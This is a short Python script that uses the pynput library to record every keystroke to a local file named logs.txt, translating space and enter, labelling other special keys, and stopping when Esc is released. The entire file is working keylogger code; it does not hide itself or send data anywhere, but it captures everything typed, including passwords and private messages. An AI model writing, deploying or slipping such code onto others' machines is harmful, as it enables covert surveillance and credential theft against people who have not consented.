from pynput.keyboard import Key, Listener

file_dest = "logs.txt"

# Capture the keystroke and it to the logs file
def on_press(key):
    # Open file in a mode to append
    with open(file=file_dest, mode="a") as f:
        try:
            # Get the character belong to this keystroke
            f.write(key.char)
        # Handle keystrokes other than letters (eg: space, enter..etc)
        except AttributeError:
            match key:
                case Key.space:
                    f.write(" ")
                case Key.enter:
                    f.write("\n")
                case _:
                    if key != Key.esc:
                        f.write(f"([{str(key).split('.')[1].upper()}])")

# Handle exiting the program
def on_release(key):
    if key == Key.esc:
        return False

# Start listening to the keyboard
with Listener(on_press=on_press, on_release=on_release) as l:
    l.join()
